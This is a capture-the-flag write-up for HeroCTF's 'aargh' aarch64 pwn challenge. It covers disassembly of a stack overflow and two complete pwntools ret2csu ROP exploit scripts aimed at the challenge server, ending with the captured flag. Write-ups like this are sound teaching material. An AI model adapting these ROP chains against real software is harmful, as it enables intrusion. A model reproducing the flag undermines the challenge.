# aargh

### Category

Pwn

### Description

Get this stranger's secret !

**Host** : aargh.heroctf.fr<br>
**Port** : 1337

Format : **Hero{flag}**<br>
Author : **SoEasY**

### Files

 - [aargh_REDACTED](aargh_REDACTED)

### Write up

Let's begin this challenge by making a checksec:
```
$ checksec ./aargh_REDACTED
[*] '/home/soeasy/GitHub/HeroCTF_v4/Pwn/aargh/aargh_REDACTED'
    Arch:     aarch64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

So here we have no PIE and no stack canary: the perfect setup to ROP.
Let's take a look at the main function:

```arm
$ aarch64-linux-gnu-objdump -d ./aargh_REDACTED
...
00000000004006fc <vuln>:
  4006fc:	a9af7bfd 	stp	x29, x30, [sp, #-272]!
  400700:	910003fd 	mov	x29, sp
  400704:	90000000 	adrp	x0, 400000 <_init-0x4c0>
  400708:	9121e000 	add	x0, x0, #0x878
  40070c:	97ffff91 	bl	400550 <printf@plt>
  400710:	90000080 	adrp	x0, 410000 <__FRAME_END__+0xf5c8>
  400714:	f947ec00 	ldr	x0, [x0, #4056]
  400718:	f9400000 	ldr	x0, [x0]
  40071c:	97ffff85 	bl	400530 <fflush@plt>
  400720:	910043e0 	add	x0, sp, #0x10
  400724:	d280bb82 	mov	x2, #0x5dc                 	// #1500
  400728:	aa0003e1 	mov	x1, x0
  40072c:	52800000 	mov	w0, #0x0                   	// #0
  400730:	97ffff84 	bl	400540 <read@plt>
  400734:	d503201f 	nop
  400738:	a8d17bfd 	ldp	x29, x30, [sp], #272
  40073c:	d65f03c0 	ret

0000000000400740 <main>:
  400740:	a9bf7bfd 	stp	x29, x30, [sp, #-16]!
  400744:	910003fd 	mov	x29, sp
  400748:	97ffffed 	bl	4006fc <vuln>
  40074c:	d503201f 	nop
  400750:	a8c17bfd 	ldp	x29, x30, [sp], #16
  400754:	d65f03c0 	ret
...
```
So the main function just calls `vuln()`. This second function will just do a `printf("...")`, `fflush(stdout)` and then a `read(stdin, char stack_buffer[256], 0x5dc)` (0x5dc == 1500): there is here an evident stack overflow.

With can by the way find an interesting function called `secret()`:
```arm
$ aarch64-linux-gnu-objdump -d ./aargh_REDACTED
...
0000000000400664 <secret>:
  400664:	a9bc7bfd 	stp	x29, x30, [sp, #-64]!
  400668:	910003fd 	mov	x29, sp
  40066c:	f90017e0 	str	x0, [sp, #40]
  400670:	f90013e1 	str	x1, [sp, #32]
  400674:	f9000fe2 	str	x2, [sp, #24]
  400678:	90000000 	adrp	x0, 400000 <_init-0x4c0>
  40067c:	91204000 	add	x0, x0, #0x810
  400680:	f9001fe0 	str	x0, [sp, #56]
  400684:	f94017e1 	ldr	x1, [sp, #40]
  400688:	d297dde0 	mov	x0, #0xbeef                	// #48879
  40068c:	f2bbd5a0 	movk	x0, #0xdead, lsl #16
  400690:	eb00003f 	cmp	x1, x0
  400694:	540002e1 	b.ne	4006f0 <secret+0x8c>  // b.any
  400698:	f94013e1 	ldr	x1, [sp, #32]
  40069c:	d29e01a0 	mov	x0, #0xf00d                	// #61453
  4006a0:	f2b201a0 	movk	x0, #0x900d, lsl #16
  4006a4:	f2d757c0 	movk	x0, #0xbabe, lsl #32
  4006a8:	f2f95fc0 	movk	x0, #0xcafe, lsl #48
  4006ac:	eb00003f 	cmp	x1, x0
  4006b0:	54000201 	b.ne	4006f0 <secret+0x8c>  // b.any
  4006b4:	f9400fe1 	ldr	x1, [sp, #24]
  4006b8:	d29e01a0 	mov	x0, #0xf00d                	// #61453
  4006bc:	f2b755a0 	movk	x0, #0xbaad, lsl #16
  4006c0:	f2d757c0 	movk	x0, #0xbabe, lsl #32
  4006c4:	f2ffdda0 	movk	x0, #0xfeed, lsl #48
  4006c8:	eb00003f 	cmp	x1, x0
  4006cc:	54000121 	b.ne	4006f0 <secret+0x8c>  // b.any
  4006d0:	f9401fe1 	ldr	x1, [sp, #56]
  4006d4:	90000000 	adrp	x0, 400000 <_init-0x4c0>
  4006d8:	91212000 	add	x0, x0, #0x848
  4006dc:	97ffff9d 	bl	400550 <printf@plt>
  4006e0:	90000080 	adrp	x0, 410000 <__FRAME_END__+0xf5c8>
  4006e4:	f947ec00 	ldr	x0, [x0, #4056]
  4006e8:	f9400000 	ldr	x0, [x0]
  4006ec:	97ffff91 	bl	400530 <fflush@plt>
  4006f0:	d503201f 	nop
  4006f4:	a8c47bfd 	ldp	x29, x30, [sp], #64
  4006f8:	d65f03c0 	ret
...
```
This function does basically this:
```c
if(arg1 == 0xDEADBEEF && arg2 == 0xCAFEBABE900DF00D && arg3 == 0xFEEDBABEBAADF00D){
	printf("Well, I guess you can have my secret: %s\n", flag);
	fflush(stdout);
}
```
So we have to call this function with the good parameters. To do this we don't have many gadgets in the binary so we will use what we can fnd: `__libc_csu_init`, `__do_global_dtors_aux` and `vuln`.

I was pretty proud of my solving script and this was the intended way to solve this challenge:
```py
from pwn import *

r = remote("aargh.heroctf.fr", 1337)
#r = process("./aargh")

"""
========== Exploitation idea ==========
- construct a pointer to secret in data section
    - w0 control: call "vuln" and enter the number of bytes wanted to stdin
    - x19 control with "ldr x19, [sp, #16]"
    - strb w0, [x19, #0x40]

- store data address in x21, set x19 to 0 (csu_init_ldp)
- store parameters in x22, x23 and x24
- call secret (csu_init_ldr)

"""

csu_init_ldp = p64(0x4007c8) # ldp x19, x20, [sp, #16] ; ldp x21, x22, [sp, #32] ; ldp x23, x24, [sp, #48] ; ldp x29, x30, [sp], #64 ; ret
csu_init_ldr = p64(0x4007a8) # ldr x3, [x21, x19, lsl #3] ; mov x2, x24 ; add x19, x19, #0x1 ; mov x1, x23 ; mov w0, w22 ; blr x3
strb_w0_x19  = p64(0x400650) # strb w0, [x19, #0x40] ; ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
ldr_x19_sp16 = p64(0x400654) #                         ldr x19, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
ldp_x29_x39  = p64(0x400658) #                                                ldp x29, x30, [sp], #0x20 ; ret
vuln_func    = p64(0x4006fc + 8) # vuln(), skipping stack frame preservation

data_addr    = 0x411030
# secret() addr: 0x400664 --> 0x64, 0x06, 0x40
PADDING_8 = b"BBBBBBBB"

rop = b"A" * 264

# Payload to construct a pointer in data section
## Store 1st byte
rop += vuln_func
rop += PADDING_8

rop += ldr_x19_sp16
rop += b"B" * 256
rop += PADDING_8                  # x29
rop += strb_w0_x19                # x30
rop += p64(data_addr - 0x40)      # x19
rop += PADDING_8 * 2

## Store 2nd byte
rop += vuln_func
rop += PADDING_8 * 3

rop += ldr_x19_sp16
rop += b"B" * 256
rop += PADDING_8                  # x29
rop += strb_w0_x19                # x30
rop += p64(data_addr - 0x40 + 1)  # x19
rop += PADDING_8 * 2

## Store 3rd byte
rop += vuln_func
rop += PADDING_8 * 3

rop += ldr_x19_sp16
rop += b"B" * 256
rop += PADDING_8                  # x29
rop += strb_w0_x19                # x30
rop += p64(data_addr - 0x40 + 2)  # x19
rop += PADDING_8 * 2


# Final payload to call secret()
rop += csu_init_ldp
rop += PADDING_8 * 2
rop += PADDING_8    # x29 --> FP (Frame Pointer)
rop += csu_init_ldr # x30 --> LR (Procedure Link Register)

rop += p64(0)  # 0x19
rop += p64(1)  # 0x20

rop += p64(data_addr)   # 0x21 --> pointer to secret() function
rop += p64(0xDEADBEEF)  # 0x22

rop += p64(0xCAFEBABE900DF00D) # 0x23
rop += p64(0xFEEDBABEBAADF00D) # 0x24

log.info(f"ROPchain size: {len(rop)} bytes")

# pause()
r.sendlineafter(b"secret? ", rop)
r.sendlineafter(b"secret? ", b"0" * (0x64 - 1))
r.sendlineafter(b"secret? ", b"1" * (0x06 - 1))
r.sendlineafter(b"secret? ", b"2" * (0x40 - 1))

# r.interactive()
log.success(r.recvall().decode())
```
But there was a lot simpler way to do it that I've discovered during the CTF (thanks @voydstack):
```py
from pwn import *

r = remote('aargh.heroctf.fr', 1337)

elf = ELF('./aargh_REDACTED')

ret2csu_init = 0x4007c8
ret2csu_call = 0x4007a8

buf = b'A'*0x108
buf += p64(ret2csu_init)
buf += p64(0)
buf += p64(ret2csu_call)
buf += p64(0)
buf += p64(1)
buf += p64(0x410e28) # ELF header ptr to .dynamic
buf += p64(0xdeadbeef)
buf += p64(0xcafebabe900df00d)
buf += p64(0xfeedbabebaadf00d)

buf += p64(0)
buf += p64(elf.sym['secret'])
buf += p64(0)
buf += p64(1)
buf += p64(0x410e28) # ELF header ptr to .dynamic
buf += p64(0xdeadbeef)
buf += p64(0xcafebabe900df00d)
buf += p64(0xfeedbabebaadf00d)

r.sendafter(b'? ', buf)
r.interactive()
```
Result of my script's execution:
```bash
$ python3 solve.py 
[+] Opening connection to aargh.heroctf.fr on port 1337: Done
[*] ROPchain size: 1344 bytes
[+] Receiving all data: Done (93B)
[*] Closed connection to aargh.heroctf.fr port 1337
[+] Well, I guess you can have my secret: Hero{ret2csu_1s_th3_w4y_f0r_th1s_f4ncy_aarch64_ROP!!!}
```

### Flag

```
Hero{ret2csu_1s_th3_w4y_f0r_th1s_f4ncy_aarch64_ROP!!!}
```
